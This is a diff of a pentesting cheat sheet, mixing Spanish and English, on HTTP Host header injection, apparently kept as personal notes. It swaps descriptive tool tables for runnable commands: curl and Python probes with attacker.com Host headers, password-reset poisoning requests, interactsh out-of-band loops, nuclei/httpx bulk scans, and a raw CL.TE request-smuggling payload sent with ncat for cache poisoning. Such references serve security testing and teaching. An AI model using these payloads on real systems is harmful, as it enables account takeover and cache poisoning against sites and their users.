@@ -24,17 +24,13 @@ linked:
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Instalar | Burp → Extensions → BApp Store → "Param Miner" | Free PortSwigger. |
-| Right-click → "Guess headers" | Auto-discover headers que afectan response | Detect XFH, X-Host, etc. |
-| Settings → "Identify cache key" | Modo dedicado para cache key analysis | HHI + cache. |
-| Force cache miss | Auto cache buster | Per request. |
-| Reflection detection | Highlights reflected inputs | Pre-detection. |
-| Custom wordlist | Append custom Host-related headers | Extender. |
-| Default wordlist | Includes XFH, X-Host, Forwarded, etc | Solid baseline. |
-| Output panel | Tab "Param Miner" muestra findings | Visual. |
-| Combine con Active Scan | HHI vectors detected automated | Comprehensive. |
-| Stop on success | Stop fuzz cuando inj confirmed | Optimization. |
-| BCheck rules (Burp Pro 2024+) | Modern HHI detection | Newer. |
+| Burp → Extensions → BApp Store → "Param Miner" → Install | Setup extension | Primera vez. |
+| Right-click request → "Guess headers" | Auto-discover headers que afectan response | Detect XFH, X-Host, Forwarded. |
+| Right-click request → "Identify cache parameters" | Modo dedicado a cache key analysis | HHI + cache combo. |
+| Param Miner → Settings → "Force cache miss" → ON | Auto cache buster por request | Avoid cache durante testing. |
+| Param Miner Output panel → tab "Param Miner" | Findings + reflection markers | Post-scan review. |
+| Right-click → "Active scan" | Scan combinado con HHI checks | Pro feature. |
+| BApp Store → "Reflection" → install | Highlight reflected inputs en historial | Pre-detection survey. |
 ^hhi-tool-paramminer
 
 ___
@@ -43,17 +39,13 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Single Host probe | `curl -H "Host: attacker.com" https://target/...` | Quick. |
-| With XFH | `curl -H "X-Forwarded-Host: attacker.com" https://target/...` | Variant. |
-| Multiple headers | `curl -H "Host: a" -H "X-Host: b" https://target/...` | Combined. |
-| Reset poisoning probe | `curl -X POST -H "Host: attacker" -d 'email=victim@target.com' https://target/forgot` | Direct. |
-| Bash loop | Iterate over header list + targets | Bulk. |
-| Save responses | `curl -o response_$h.txt ...` per Host value | Forensic. |
-| Compare responses | `diff response_normal.txt response_injected.txt` | Detection oracle. |
-| Burp Collaborator monitor | Watch Collaborator dashboard while sending | OOB confirm. |
-| Cache header fuzz | Iterate `Host` y `X-Forwarded-Host` con `?cb=$RANDOM` | Avoid cache during testing. |
-| Header smuggling combo | `curl --resolve` + Host trick | Edge. |
-| HTTP/2 :authority | `curl --http2 -H ":authority: attacker.com" ...` | H2 specific. |
+| `curl -H "Host: attacker.com" https://target/` | Single Host probe | Quick test. |
+| `curl -H "X-Forwarded-Host: attacker.com" https://target/` | XFH variant probe | Most common alt. |
+| `curl -H "Host: target.com" -H "X-Forwarded-Host: attacker.com" https://target/forgot -X POST -d "email=victim@target.com"` | Reset poisoning probe | Standard test. |
+| `curl --http2 -H ":authority: attacker.com" -H "Host: target.com" https://target/` | HTTP/2 :authority differential | H2 endpoint. |
+| `for h in 'Host' 'X-Forwarded-Host' 'X-Host' 'X-HTTP-Host-Override' 'Forwarded'; do curl -sI -H "$h: $(./interactsh-client -url-only)" https://target/forgot; done` | Bulk header probe + Collaborator OOB | Discovery automation. |
+| `interactsh-client -v &` y enviar requests con Collaborator host | Watch DNS/HTTP callbacks | OOB confirmation. |
+| `diff <(curl -s https://target/) <(curl -s -H "X-Forwarded-Host: attacker" https://target/)` | Response diff oracle | Detection. |
 ^hhi-tool-curl
 
 ### Bash one-liner para detección
@@ -69,7 +61,6 @@ HEADERS=(
   "X-Host: $COLLABORATOR_HOST"
   "X-HTTP-Host-Override: $COLLABORATOR_HOST"
   "Forwarded: host=$COLLABORATOR_HOST"
-  "X-Original-URL: /admin"
 )
 
 for h in "${HEADERS[@]}"; do
@@ -78,26 +69,22 @@ for h in "${HEADERS[@]}"; do
     -d "email=$EMAIL" "$TARGET"
 done
 
-# Watch Collaborator dashboard for callbacks
-./interactsh-client -v
+./interactsh-client -v   # watch callbacks
 ```
 
 ___
 
-## Wordlists (PayloadsAllTheThings)
+## Wordlists
 
-| **Wordlist** | **Path / Repo** | **Uso** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| PayloadsAllTheThings - Host Header | https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Web%20Cache%20Deception | Cache adjacent. |
-| HackTricks - HHI | https://book.hacktricks.xyz/pentesting-web/abusing-hop-by-hop-headers | Referencia. |
-| SecLists - common headers | `SecLists/Miscellaneous/web/http-request-headers/` | Generic. |
-| Custom HTTP headers | `assetnote/wordlists` | Modern. |
-| Burp Intruder built-in | "HTTP request headers" payload set | Pro feature. |
-| Custom Host values | localhost / 127.0.0.1 / internal-* / dev-* / staging-* | Internal targets. |
-| Cloud metadata IPs | 169.254.169.254, 100.100.100.200, etc | SSRF chain. |
-| Common subdomains | admin, api, dev, staging, test, internal, jenkins, gitlab | Subdomain enum + HHI. |
-| Burp Collaborator dynamic | Per-request unique subdomain | OOB callback. |
-| `interactsh` payloads | Same | Alternative. |
+| `git clone https://github.com/swisskyrepo/PayloadsAllTheThings && ls PayloadsAllTheThings/Web\ Cache\ Deception` | PayloadsAllTheThings cache + HHI | Foundation. |
+| Browser → https://book.hacktricks.xyz/pentesting-web/abusing-hop-by-hop-headers | HackTricks reference | Lookup completo. |
+| `cat /usr/share/seclists/Miscellaneous/web/http-request-headers/* \| sort -u > headers.txt` | SecLists HTTP headers | Wordlist headers. |
+| `wget https://wordlists-cdn.assetnote.io/data/manual/http-request-headers.txt` | Assetnote curated headers | Modern. |
+| `cat <<EOF > host-vals.txt\nlocalhost\n127.0.0.1\n169.254.169.254\nadmin.internal\napi.internal\nEOF` | Custom Host values list | Internal vhost discovery. |
+| `interactsh-client -url-only` | Generate canary URL para OOB | Per-test unique. |
+| `wget https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Cloud/AWS%20-%20Metadata.md` | Cloud metadata IPs reference | SSRF chain. |
 ^hhi-tool-wordlists
 
 ___
@@ -106,29 +93,13 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| Burp HTTP Request Smuggler | Identify HRS first | Pre-requisito. |
-| Smuggle attack panel | Right-click + Smuggle attack | Setup. |
-| Smuggle Host injection | Second request smuggled con malicious Host | Combo HHI + HRS. |
-| Smuggle X-Forwarded-Host | Same vector via XFH | Variant. |
-| Cache poison via smuggle | Smuggled response cached | Compound chain. |
-| Validate impact | Re-fetch normal request → check poisoned response | Verification. |
-| HTTP/2 downgrade combo | H2.CL / H2.TE + HHI smuggling | Modern chain. |
-| Combine con cache config | If cache trusts XFH | Multi-vector. |
+| Burp → BApp Store → "HTTP Request Smuggler" → Install | Setup extension HRS | Primera vez. |
+| Right-click request → "HTTP Request Smuggler" → "Detect / Smuggle attack" | Auto-detect HRS + smuggle attack panel | Pre-attack identification. |
+| Smuggle attack → modify smuggled second request con `X-Forwarded-Host: attacker.com` | Combo HHI via smuggling | HRS + HHI compound. |
+| Smuggled cache poison: smuggle GET con XFH attacker → cached | Mass victim impact | Cache poisoning chain. |
+| Verificar post-smuggle: `curl https://target/login` (legit user) → recibe poisoned response | Validation cache poisoned | Confirmation. |
+| `printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET / HTTP/1.1\r\nHost: target.com\r\nX-Forwarded-Host: attacker.com\r\n\r\n' \| ncat target 80` | Manual CL.TE smuggling con HHI inject | Sin Burp. |
 ^hhi-tool-smuggler
-
-### HRS + HHI workflow combo
-
-```
-1. Identify HRS vector (CL.TE, TE.CL, H2.CL, etc).
-2. Use HTTP Request Smuggler ext con cache poisoning combo.
-3. Smuggle malicious request:
-   POST /forgot HTTP/1.1
-   Host: target.com
-   X-Forwarded-Host: attacker.com
-   ...
-4. Smuggled response cached with attacker.com en `<base href>`.
-5. All subsequent legit users hit cache → see attacker domain.
-```
 
 ___
 
@@ -136,17 +107,13 @@ ___
 
 | **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
-| `httprobe` | Verify Host responsiveness | Recon adjacent. |
-| `host-header-injection-fuzzer` | Custom scripts en GitHub | Various. |
-| nuclei templates | `templates/cves/host-header-injection.yaml` | Bulk scan. |
-| ZAP active scanner | OWASP ZAP HHI rule | Free alternative. |
-| `paramspider` | URL discovery con params | Recon. |
-| Burp Collaborator | OOB confirm | Standard. |
-| `interactsh-client` | OOB free alternative | Standard. |
-| `dnscanary` | DNS-only OOB | Light. |
-| Custom Python `requests` | Programmable | Same as curl. |
-| `httpx` | Modern HTTP client | Async. |
-| `rad` | URL discovery | Recon. |
+| `nuclei -t http/cves/ -l targets.txt -tags hhi` | nuclei templates HHI scanning | Bulk scan. |
+| `nuclei -t http/misconfiguration/host-header-injection.yaml -u https://target/forgot` | Specific HHI template | Targeted scan. |
+| `httpx -l hosts.txt -path /forgot -H "X-Forwarded-Host: $(interactsh-url)"` | Bulk Host inject probe | Volume testing. |
+| ZAP → Active Scan → custom HHI rule | OWASP ZAP free alternative | Sin Burp Pro. |
+| `paramspider -d target.com` | URL + param discovery | Recon adjacent. |
+| `python3 -c "import requests; r=requests.post('https://target/forgot', headers={'X-Forwarded-Host':'attacker'}, data={'email':'v@t'}); print(r.headers, r.text[:200])"` | Programmable Python probe | Custom logic. |
+| `httpx --http2 -l hosts.txt -path /forgot -H ':authority: attacker'` | HTTP/2 :authority bulk | H2 testing. |
 ^hhi-tool-others
 
 ***
